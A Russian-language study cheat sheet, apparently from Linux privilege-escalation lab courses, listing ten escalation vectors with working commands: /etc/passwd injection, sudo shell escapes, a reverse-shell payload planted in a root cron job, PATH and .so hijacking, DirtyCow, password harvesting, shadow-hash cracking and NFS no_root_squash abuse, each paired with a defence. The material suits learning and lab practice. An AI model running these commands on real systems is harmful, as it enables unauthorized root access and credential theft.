# Linux Privilege Escalation — карта векторов

Конспект по privesc (Linux PrivEsc + Arena). Цель: из низкоправного юзера → root.
Финал большинства машин. НЕ зубрить команды — держать под рукой + LinPEAS + GTFOBins.

**Ресурсы:** GTFOBins (gtfobins.github.io) — как выжать shell из sudo/SUID программы.
**Автоматизация:** LinEnum / LinPEAS — проверяют ВСЕ векторы разом (см. tools.md).

---

## Карта векторов (что проверять)
1. sudo -l — что разрешено от root
2. SUID/SGID-бинарники
3. writable /etc/passwd (или /etc/shadow)
4. cron-задачи
5. PATH hijacking
6. kernel exploits (DirtyCow и др.)
7. stored passwords (пароли в конфигах)
8. SUID shared object (.so) injection
9. NFS no_root_squash
10. sudo shell escaping (find/awk/nmap/vim...)

---

## 1. Права файлов и SUID (фундамент)

Три категории «кому» даются права:
- user — владелец файла (один человек)
- group — все члены группы файла (набор юзеров; свои группы: `id`)
- others — все остальные

**SUID (Set User ID):** файл ВСЕГДА выполняется с правами ВЛАДЕЛЬЦА, кто бы ни запустил.
- владелец root + SUID → ЛЮБОЙ запустивший действует как ROOT
- обозначение: 's' вместо 'x' в блоке ВЛАДЕЛЬЦА: rws-r-x-r-x
- аналогия: пропуск владельца, прибитый к двери — все проходят под именем владельца (root)
- **SGID:** то же, но права ГРУППЫ. 's' в блоке группы: rwx-r-s-r-x.

Поиск:
```
find / -perm -4000 -type f 2>/dev/null    # SUID (-4000 = бит SUID; - = «как минимум»)
find / -perm -2000 -type f 2>/dev/null    # SGID
```
`2>/dev/null` — скрыть ошибки Permission denied (stderr → мусорку).

**Зачем SUID нужен (не только атака):** механизм для точечных root-прав. passwd (SUID root)
меняет пароль → пишет в /etc/shadow (только root). Без SUID юзер не сменил бы пароль.
Также sudo, su, mount, ping.

**Опасность НЕ в SUID, а в применении:** SUID на «мощной» программе (bash/find/vim/python/cp
— умеют выполнить команду/shell/читать любой файл) → от root даёт больше задуманного → privesc.
Защита: SUID только на узкие программы (passwd). Принцип наименьших привилегий.
Атака: SUID на программе с exec → GTFOBins → root.

---

## 2. Writable /etc/passwd

Файл доступен на запись обычному юзеру (мисконфиг). Дописываешь юзера с UID=0.
```
openssl passwd -1 -salt new 123        # сгенерить хеш пароля 123
echo 'new:$1$new$хеш:0:0:root:/root:/bin/bash' >> /etc/passwd   # ОДИНАРНЫЕ кавычки!
su new                                  # пароль 123 → root
```
Формат (7 полей): username:password(x=в shadow/или хеш тут):UID:GID:comment:home:shell
Суть: UID 0 = root ВСЕГДА, независимо от имени.
**ВАЖНО:** одинарные кавычки при echo — в двойных bash съест $ хеша (→ Authentication failure).
Защита: /etc/passwd на запись ТОЛЬКО root (chmod 644, chown root:root).

---

## 3. Sudo — что разрешено от root

```
sudo -l    # список разрешённых от root команд (ищи NOPASSWD)
```

### 3a. Sudo shell escaping — программа с функцией exec → root-shell
Программы, разрешённые в sudo, умеют выполнить shell изнутри → root (все на GTFOBins):
```
sudo find /bin -name X -exec /bin/sh \;      # find -exec
sudo awk 'BEGIN {system("/bin/sh")}'         # awk system()
sudo vim -c '!sh'                            # vim ! (или :!sh внутри)
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse   # nmap NSE
```
Также: less/more/nano/python — если разрешены в sudo. Использовать ту, что в sudo -l.
Защита: не давать в sudo программы с exec (find/awk/vim/nmap/python); только узкие.

---

## 4. Cron privesc

cron daemon по расписанию выполняет задачи (часто от root).
```
cat /etc/crontab; ls -la /etc/cron.*    # найти задачу от root с ИЗМЕНЯЕМЫМ скриптом
```
Нашёл cron-задачу от root, запускающую скрипт, который можешь редактировать → вписываешь
reverse shell → cron запустит от root → root-shell.
**ВАЖНО:** payload вписывать в ТОТ ЖЕ путь, что в crontab (не в /tmp, если cron ждёт в Desktop)!

Reverse shell (на СВОЕЙ Kali генеришь payload → на цели в cron):
```
# Kali: msfvenom -p cmd/unix/reverse_netcat lhost=<твой tun0 IP> lport=8888 R
# Kali: nc -lvnp 8888   (listener: -l слушать, -v verbose, -n no-DNS, -p порт)
# в cron-скрипт вписать payload → cron выполнит от root → shell на listener
```
Shell прилетел («connect from») — немой, печатай вслепую (whoami/id).
Апгрейд: python3 -c 'import pty; pty.spawn("/bin/bash")'.

---

## 5. PATH hijacking

SUID-программа зовёт команду БЕЗ полного пути (ls, не /bin/ls) → ищет по PATH.
Подсовываешь фальшивую команду первой в PATH:
```
cd /tmp
echo "/bin/bash" > ls        # фальшивый ls = запустить bash
chmod +x ls
export PATH=/tmp:$PATH        # /tmp первым (командой! НЕ через .bashrc)
# запустить SUID-программу → она зовёт ls → находит твой → root-shell
```
Вернуть PATH: export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
Защита: в программах вызывать команды с ПОЛНЫМ путём.

---

## 6. Kernel exploit (DirtyCow, CVE-2016-5195)

Баг ЯДРА (не мисконфиг). Dirty Copy-On-Write: race condition → запись в read-only файлы → root.
```
uname -a                                          # версия ядра
# linux-exploit-suggester.sh — предлагает эксплойты по версии
gcc -pthread c0w.c -o c0w                          # компилировать (-pthread: race между потоками)
./c0w                                              # 1-2 мин, подменяет /usr/bin/passwd
passwd                                             # подменённый passwd даёт root
id                                                 # uid=0?
# восстановить: cp /tmp/passwd /usr/bin/passwd (cp, не copy!) или reset машины
```
**Kernel exploit — ПОСЛЕДНЕЕ средство:** рискует уронить систему (kernel panic). Сначала мягкие
векторы (SUID/sudo/cron), kernel exploit если ничего не помогло. Нужна уязвимая версия ядра.
Защита: обновлять ядро (патчи).

---

## 7. Stored passwords (пароли в конфигах)

Пароли открытым текстом в конфигах. Сам пароль привилегий НЕ даёт — ценен ПЕРЕИСПОЛЬЗОВАНИЕМ.
```
cat /etc/openvpn/auth.txt              # VPN логин/пароль открытым текстом
cat /home/*/.irssi/config              # IRC пароль
cat ~/.bash_history                    # пароли в истории команд
grep -r "password" /etc /home 2>/dev/null
find / -name "*.ovpn" 2>/dev/null
```
Нашёл пароль → ПРОБУЕШЬ везде: su root, su <юзер>, sudo, SSH. Люди переиспользуют → подходит → privesc.
Эксплуатирует человеческий фактор (пароли в открытом виде + переиспользование).
Защита: не хранить пароли открытым текстом (vault); не переиспользовать.

---

## 8. /etc/shadow — кража и взлом хешей

Если /etc/shadow читаем (мисконфиг) — вытащить хеши, взломать офлайн.
```
# на цели: cat /etc/passwd и cat /etc/shadow → сохранить оба на Kali
# на Kali:
unshadow passwd.txt shadow.txt > unshadowed.txt   # ПОРЯДОК: passwd потом shadow!
hashcat -m 1800 unshadowed.txt rockyou.txt -O      # -m 1800 = sha512crypt ($6$)
# или john unshadowed.txt --wordlist=rockyou.txt
```
**ВАЖНО:** порядок unshadow — passwd первым. Перепутал → 'x' вместо хешей → Token length exception.
Тип хеша: $6$ = sha512crypt (-m 1800), $1$ = md5crypt (-m 500).
Защита: /etc/shadow только root (chmod 640, root:shadow).

---

## 9. SUID shared object (.so) injection

SUID-программа подгружает .so из writable папки, но файла нет → подсовываешь свою .so.
```
# detection: найти, какую .so ищет SUID-программа
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
# видишь: ищет libcalc.so в writable папке ("no such file")

# exploit: создать вредоносную .so
mkdir /home/user/.config; cd /home/user/.config
# libcalc.c:
#   static void inject() __attribute__((constructor));
#   void inject(){ system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"); }
gcc -shared -o libcalc.so -fPIC libcalc.c
/usr/local/bin/suid-so                 # загрузит твою .so ОТ ROOT → constructor → root-shell
```
__attribute__((constructor)) — функция выполнится при загрузке .so. Похоже на PATH hijacking,
но с библиотекой. Защита: SUID-программы грузят .so только из доверенных путей.

---

## 10. NFS no_root_squash

NFS — монтирование удалённой папки по сети. root_squash (норма) понижает твой root до nobody
на шаре. no_root_squash (дыра) — твой root ОСТАЁТСЯ root на шаре.
```
# detection (attacker): showmount -e <target_IP>  → ищешь no_root_squash в /etc/exports
# exploit (attacker, ты root):
mkdir /tmp/nfs
mount -o rw,vers=3 <target_IP>:/<share> /tmp/nfs
cd /tmp/nfs
echo 'int main(){setgid(0);setuid(0);system("/bin/bash");return 0;}' > x.c
gcc x.c -o x; chmod +s x                # SUID-root бинарник на шаре
# на ЦЕЛИ (обычный юзер): cd /<share>; ./x → SUID-root → root-shell
```
Суть: создаёшь root-SUID файл со своей машины на шаре → запускаешь на цели.
Защита: root_squash в /etc/exports.

---

## Bonus: nginx logrotate (CVE-2016-1247)
nginxed-root.sh создаёт symlink error.log → /etc/ld.so.preload в writable logdir → ждёт
logrotate (cron), который перезапускает nginx ОТ ROOT → активирует подмену → root.
Требует 2 терминала (T1 эксплойт, T2 root вручную invoke-rc.d nginx rotate — ускорить logrotate).

---

## Методология privesc (главное)
1. Получил shell → запустить LinPEAS/LinEnum (проверит все векторы разом)
2. Читать отчёт, отметить подсвеченное
3. Ручная проверка ключевого: sudo -l, find SUID, cat /etc/crontab, uname -a, конфиги с паролями
4. Нашёл вектор → GTFOBins / этот конспект → команда эксплуатации
5. Проверка root: id (uid=0?), whoami

НЕ зубрить команды — держать конспект + GTFOBins + LinPEAS. Частое осядет с практикой на машинах.
Промпт # = root, $ = обычный юзер.